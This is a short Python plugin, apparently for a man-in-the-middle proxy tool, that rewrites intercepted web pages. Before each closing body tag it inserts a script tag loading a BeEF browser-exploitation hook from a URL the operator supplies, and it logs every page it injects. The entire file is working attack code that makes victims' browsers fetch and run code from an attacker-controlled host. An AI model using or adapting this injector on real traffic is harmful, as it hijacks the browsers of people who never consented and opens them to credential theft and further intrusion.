from Plugin import PluginProxy

class beef(PluginProxy):
    ''' this module proxy inject hook beef api.'''
    _name          = 'beef_hook'
    _argsname      = 'Url:'
    _activated     = False
    _instance      = None
    _requiresArgs  = True

    @staticmethod
    def getInstance():
        if beef._instance is None:
            beef._instance = beef()
        return beef._instance

    def __init__(self):
        self.LoggerInjector()
        self.hook_url = None

    def setInjectionCode(self, code):
        self.hook_url = code

    def inject(self, data, url):
        injection_code = '<script type="text/javascript" src="{}"></script>'.format(self.hook_url)
        self.logging.info("Injected: %s" % (url))
        return data.replace('</body>', '{}</body>'.format(injection_code))
